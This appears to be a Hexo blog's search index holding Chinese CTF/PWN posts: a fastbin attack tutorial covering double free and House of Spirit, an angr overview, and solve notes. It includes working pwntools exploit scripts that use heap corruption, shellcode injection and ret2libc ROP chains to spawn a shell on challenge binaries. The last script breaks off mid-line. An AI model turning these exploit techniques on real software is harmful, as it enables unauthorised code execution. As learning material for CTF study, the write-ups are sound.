<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>fastbin_attack系列</title>
      <link href="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/"/>
      <url>/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h1 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin_attack"></a>fastbin_attack</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>fastbin attack指所有基于fastbin机制的漏洞利用方法，利用前提：</p><ul><li>存在堆溢出、uaf等能控制chunk内容的漏洞</li><li>漏洞发生于 fastbin类型的chunk中</li></ul><p>细分可做到如下分类</p><ul><li><strong>Fastbin Double Free</strong></li><li><strong>House of Spirit</strong></li></ul><blockquote><p>Fastbin Double Free 和 House of Spirit 侧重“正常由用户创建的chunk”和“由攻击者伪造的chunk”，然后再次申请chunk进行攻击</p></blockquote><ul><li><strong>Alloc to Stack</strong></li><li><strong>Arbitary Alloc</strong></li></ul><blockquote><p>Alloc to Stack 和 Arbitary Alloc 侧重利用堆溢出等方式修改chunk的fd指针，即直接申请指定位置的chunk进行攻击</p></blockquote><h2 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h2><p>if a chunk is freed and goes into <strong>fastbin</strong> the <strong>prev_inuse</strong> flag of the next heap will not be cleared</p><blockquote><ul><li><p>PREV_INUSE(abbreviated as <strong>P</strong>,in the lowest bit of the chunk size field)</p><p>Record whether the previous chunk block is in the allocated state.In general,<strong>the P-bit of the size field of the first allocated memory block in the heap is set to 1 to prevent access to the previous illegal memory.</strong> When the P-bit of a chunk is 0,we can use the prev_size field to get the size and address of the previous chunk.This also facilitates merging between idle chunks.</p></li></ul></blockquote><p><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250412200540385.png" alt="image-20250412200540385"><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250412200629044.png" alt="image-20250412200629044"></p><h2 id="1-double-free"><a href="#1-double-free" class="headerlink" title="1. double free"></a>1. double free</h2><ol><li>Once the fastbin’s heap is freed the <strong>P-bit</strong> of the next chunk will not be emptied</li><li>when free fastbin,just verify the chunk that the main arena points to,i.e.,the chunk at the head of the linked list pointer.For the chunks behind the linked list,there’s no validation.</li></ol><p><a href="https://xuanxuanblingbling.github.io/assets/pwn/paper">https://xuanxuanblingbling.github.io/assets/pwn/paper</a></p><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>paper<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250412204239899.png" alt="image-20250412204239899"></p><p>without<code>link_list[del_index]=NULL</code>,<code>UAF</code></p><p>利用思想: 利用fastbin的free只检查是否和上一个freechunk相等，使得同一个chunk两次进入free list，造成UAF，可以更改fastbin free chunk的fd信息，最终分配一个特定地址<br>利用难点</p><p>需要能够两次free同一个chunk<br>更改fd的时候，为了能够在之后的malloc之后返回这个值，需要通过一个check，会检查fd指向的这个位置的size(这个位置可以不用对齐)，看是否属于正要malloc的这个bin的范围。<br>详细信息</p><p>其漏洞的主要原因在于fastbin<br>的实现其实是一个单链表实现的栈，后进先出，free的时候只检查了这个栈的栈顶，这样的话，<br>只要不是连续的free两次同一个chunk，就可以顺利的将一个chunk放进free list。之后的分配会使得<br>chunk虽然在free list里，但是也被分配了出来，这样就可以更改到fd指针，使其指向其他位置。</p><p>检查栈顶的代码如下:</p><pre><code>/* Check that the top of the bin is not the record we are going to add   (i.e., double free).  */if (__builtin_expect (old == p, 0))  &#123;    errstr = &quot;double free or corruption (fasttop)&quot;;    goto errout;  &#125;</code></pre><p>需要注意的一点是，在分配的时候还有一个检查:</p><pre><code>      if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))        &#123;          errstr = &quot;malloc(): memory corruption (fast)&quot;;        errout:          malloc_printerr (check_action, errstr, chunk2mem (victim), av);          return NULL;        &#125;      check_remalloced_chunk (av, victim, nb);</code></pre><p>这个检查是指即将分配的这个chunk大小应该在其相应大小的idx上，比如size都为0x20大小的<br>fastbin，能够接受的值就是0x20-0x27范围，分配过去应该有这个范围的值（被当做size），<br>否则将会出现memory corruption。</p><p>所以利用的时候需要想办法找到一个相应的size，<strong>这个size其实是不需要对齐的</strong>(just check low 4 bytes)，所以可以通过<br>错位的方式构造一个假的size值出来。找到相应的size就可以进行分配到相应位置了。<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250412220831246.png" alt="image-20250412220831246"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./paper&#x27;</span>) </span><br><span class="line">elf=ELF(<span class="string">&#x27;./paper&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;delete paper&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;0-9&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;long&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;delete paper&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;0-9&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>,p64(<span class="number">0x60202a</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">b&quot;\x40\x00\x00\x00\x00\x00&quot;</span>+p64(elf.symbols[<span class="string">&#x27;gg&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-House-of-Spirit"><a href="#2-House-of-Spirit" class="headerlink" title="2. House of Spirit"></a>2. House of Spirit</h2><h3 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h3><p>The key to using house of Spirit is the ability to override a heap poiont(the address that malloc_data returned in the chunk after calling malloc)to point an area can be controlled.</p><ol><li>伪造堆块</li><li>覆盖堆指针指上一步伪造的堆块</li><li>释放堆块，将伪造的堆块放入fastbin的单链表里面（绕过检测）</li><li>申请堆块，释放刚才申请的堆块，最终可以使向目标区域中写入数据，以达到控制内存的目的</li></ol><p>一般来说想要控制的目标区域多为返回地址或是一个函数指针，正常情况下，该内存区域我们是无法通过输入数据来进行控制的，想要利用hos攻击技术来改写该区域，首先需要我们可以控制那片目标区域的前面空间和后面空间。</p><p><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250423162555963.png" alt="image-20250423162555963"></p><h4 id="free时需要被绕过的检测"><a href="#free时需要被绕过的检测" class="headerlink" title="free时需要被绕过的检测"></a>free时需要被绕过的检测</h4><ol><li><code>fake chunk</code>的<code>ISMMAP</code>位不能为1，<code>free</code>时，<code>mmap</code>的chunk会单独处理</li><li><code>fake chunk</code>地址对齐，<code>MALLOC_ALIGN_MASK</code></li><li><code>size</code>大小要满足对应fastbin的需求，同时也得对齐</li><li><code>fake_chunk</code>的<code>next chunk</code>的大小不能小于<code>2*SIZE_SZ</code>,同时也不能大于<code>av-&gt;system_mem</code></li><li><code>fastbin</code>的链表头部不能是该fake_chunk,否则不能构成<code>double free</code></li></ol><h3 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h3><p>总的来说，houseofspirit的主要意思是我们想要控制的区域控制不了，但是它前面和后面都可以控制，所以伪造好数据将它放入fastbin中，后面将该内存区域当作堆块申请出来，致使该区域被当作普通的内存使用，从而使目标区域变成可控的。</p><h3 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h3><p><a href="https://www.52pojie.cn/thread-1819636-1-1.html">LCTF 2016 : PWN200 - 吾爱破解 - 52pojie.cn</a></p><p>2016-iscc-pwn200<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250418134608234.png" alt="image-20250418134608234"><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250418135348455.png" alt="image-20250418135348455"></p><p>循环48次，分配了48字节，填满由于printf的特性（打印直到<code>\x00</code>）可以泄露ebp</p><p>如果输入0x38位，那么实际输入的会是0x39位，因为read函数也会将’/n’输入到内存中，结果是会覆盖掉dest最低的一个字节，导致不能查看堆信息。</p><p><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250418140737023.png" alt="image-20250418140737023"></p><p>溢出</p><p><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/640.webp" alt="640"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><ol><li><p>输入name的时候，将shellcode输入，并补齐0x30字节，以通过off-by-one漏洞泄漏rbp地址；<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250424152122813.png" alt="image-20250424152122813"></p></li><li><p>输入money的时候，在money里伪造chunk，注意要绕过free函数的检查。并通过相邻变量覆盖漏洞覆盖dest指针，将其覆盖为fake chunk的user data地址，那么输入完之后，dest指针赋值给ptr，ptr也指向fake chunk的user data地址。<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250424152224738.png" alt="image-20250424152224738"></p><blockquote><p>框中依次为size，return_address,shellcode</p></blockquote></li><li><p>调用checkout，将伪造chunk放入fastbin中，并置ptr指针为NULL；<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250424152555116.png" alt="image-20250424152555116"></p><p>fastbins中有了栈地址。申请0x30大小即可将其申请出来</p><p>该地址+0x10即为用户区<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250424152911021.png" alt="image-20250424152911021">填充0x18的nop，再写入shellcode的地址即可让程序转而执行shellcode</p></li><li><p>调用checkin，因为ptr==NULL，将重新malloc指定大小的chunk并输入数据，此时，便可以malloc可控1区域下方的不可控区域，覆盖input_number_and_menu函数的返回地址为shellcode地址；<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250424153639792.png" alt="image-20250424153639792">看到返回地址已经变为shellcode地址</p></li><li><p>退出时choose函数跳转去执行shellcode。<strong>getshell！</strong><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250424153838669.png" alt="image-20250424153838669"></p></li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leek_rbp</span>():</span><br><span class="line">    <span class="keyword">global</span> fake_addr</span><br><span class="line">    <span class="keyword">global</span> shellcode_addr</span><br><span class="line"></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    payload = shellcode.ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;who are u?\n&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(payload)</span><br><span class="line">    rbp_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&quot;rbp_addr: 0x%x&quot;</span> % rbp_addr)</span><br><span class="line"></span><br><span class="line">    shellcode_addr = rbp_addr - <span class="number">0x50</span></span><br><span class="line">    log.info(<span class="string">&quot;shellcode_addr: 0x%x&quot;</span> % shellcode_addr)</span><br><span class="line">    fake_addr = rbp_addr - <span class="number">0x90</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overwrite_dest</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;give me your id ~~?\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;65&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;give me money~\n&#x27;</span>)</span><br><span class="line">    data = p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + p64(<span class="number">0</span>) + p64(fake_addr)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;long?\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;48&#x27;</span>)</span><br><span class="line">    p.recvline(<span class="string">b&#x27;48&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x18</span> + p64(shellcode_addr)</span><br><span class="line">    data = data.ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    leek_rbp()</span><br><span class="line">    overwrite_dest()</span><br><span class="line">    get_shell()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crypwnto出题记录</title>
      <link href="/2025/04/08/NPC_final%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0%EF%BC%88%E9%80%9A%E8%BF%87fmt%E8%BF%9B%E8%A1%8CRSA-CRT%20Fault%20Injection%E5%AE%9E%E8%B7%B5%EF%BC%89/"/>
      <url>/2025/04/08/NPC_final%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0%EF%BC%88%E9%80%9A%E8%BF%87fmt%E8%BF%9B%E8%A1%8CRSA-CRT%20Fault%20Injection%E5%AE%9E%E8%B7%B5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="比赛未结束，暂不公开"><a href="#比赛未结束，暂不公开" class="headerlink" title="比赛未结束，暂不公开"></a>比赛未结束，暂不公开</h2>]]></content>
      
      
      <categories>
          
          <category> 出题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具篇·Angr</title>
      <link href="/2025/03/29/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7Angr/"/>
      <url>/2025/03/29/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7Angr/</url>
      
        <content type="html"><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><h3 id="官方"><a href="#官方" class="headerlink" title="官方"></a>官方</h3><p><a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=7546500">Angr开发者发布在IEEE上的论文</a></p><p>angr官方文档<a href="https://docs.angr.io/">README - angr Documentation</a></p><p>angr的API文档<a href="https://api.angr.io/">angr API documentation — angr 9.2.26 documentation</a></p><h3 id="实战项目"><a href="#实战项目" class="headerlink" title="实战项目"></a>实战项目</h3><p>angr_ctf项目<a href="https://github.com/jakespringer/angr_ctf">GitHub - jakespringer/angr_ctf</a></p><h3 id="师傅们的博客"><a href="#师傅们的博客" class="headerlink" title="师傅们的博客"></a>师傅们的博客</h3><p><a href="https://www.cnblogs.com/level5uiharu">https://www.cnblogs.com/level5uiharu</a></p><p><a href="https://www.cnblogs.com/0xJDchen/p/9291335.html">https://www.cnblogs.com/0xJDchen/p/9291335.html</a></p><p><a href="https://blog.csdn.net/qq_44370676/article/details/119714879">https://blog.csdn.net/qq_44370676/article/details/119714879</a></p><p><a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM/tree/master">https://github.com/ZERO-A-ONE/AngrCTF_FITM/tree/master</a></p><p><a href="https://starrysky1004.github.io/2024/12/17/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/">https://starrysky1004.github.io/2024/12/17/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/</a></p><p><a href="https://arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/">https://arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/</a></p><p><a href="https://blog.csdn.net/weixin_49393427/article/details/119989356\">https://blog.csdn.net/weixin_49393427/article/details/119989356\</a></p><p><a href="https://github.com/a7vinx/angr-doc-zh_CN/blob/master/docs/overview.md">https://github.com/a7vinx/angr-doc-zh_CN/blob/master/docs/overview.md</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li><p>创建虚拟环境 <code>virtualenv AngrEnv</code></p></li><li><p>启动虚拟环境 <code>source ./AngrEnv/bin/activate</code></p></li><li><p><code>pip install angr</code></p></li><li><p>退出环境<code>deactivate</code></p></li></ul><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>angr 是一个支持多处理架构的用于二进制文件分析的工具包，它提供了动态符号执行的能力以及多种静态分析的能力。它可以被使用者扩展，用于自动化逆向工程、漏洞挖掘等多个方面</p><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img src="/2025/03/29/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7Angr/1024198-20180710185031100-931587792.png" alt="1024198-20180710185031100-931587792"></p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li>利用符号执行探究执行路径，自动解ctf逆向题</li><li>利用angr获取程序控制流（CFG)</li><li>利用angr生成rop链</li><li>利用angr发现漏洞</li><li>利用angr加密程序</li><li>进行污点跟踪</li></ul>]]></content>
      
      
      <categories>
          
          <category> 解题工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题工具 </tag>
            
            <tag> Angr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN刷题笔记（长期更新）</title>
      <link href="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="GHCTF"><a href="#GHCTF" class="headerlink" title="GHCTF"></a>GHCTF</h2><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello_World"></a>Hello_World</h3><p>绕PIE<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">offset=<span class="number">40</span></span><br><span class="line">backdoor = <span class="string">b&quot;\xC5&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset + backdoor</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250314192604.png" alt="Pasted image 20250314192604"><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>] </span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manu</span>(<span class="params">choice</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;money\n&#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flowers</span>(<span class="params">kind,num</span>):</span><br><span class="line">    manu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;20\n&#x27;</span>,<span class="built_in">str</span>(kind))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    1.peony $10</span></span><br><span class="line"><span class="string">    2.rose $100</span></span><br><span class="line"><span class="string">    3.fragrans $20</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;buy?\n&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hell_money</span>(<span class="params">count</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(count).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">see_it</span>(<span class="params">count</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(count).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hell_money(<span class="number">100</span>)</span><br><span class="line">pause()</span><br><span class="line">see_it(<span class="number">10000</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"><span class="comment">#0x0000000000400579 : ret</span></span><br><span class="line">ret=<span class="number">0x0000000000400579</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400d73</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x0000000000400B1E</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x48</span>  +p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;it!!!\n&#x27;</span>)</span><br><span class="line">puts_addr = p.recvline()[:<span class="number">6</span>]</span><br><span class="line">puts_addr = u64(puts_addr.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base--&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;system--&gt;&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x48</span>  +p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313130300.png" alt="Pasted image 20250313130300"><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313130240.png" alt="Pasted image 20250313130240"><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313132719.png" alt="Pasted image 20250313132719"><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313132731.png" alt="Pasted image 20250313132731"><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313135230.png" alt="Pasted image 20250313135230"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>] </span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">rbp_ret = <span class="number">0x40117d</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">bss = <span class="number">0x4044e8</span></span><br><span class="line">printf=<span class="number">0x401227</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">5</span>) + <span class="string">b&#x27;%27$p&#x27;</span> + p64(bss+<span class="number">0x400</span>)+p64(printf)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;magic\n&#x27;</span>,payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">5</span>))</span><br><span class="line">address=p.recvuntil(<span class="string">b&#x27;\xe8&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">address=<span class="built_in">int</span>(address,<span 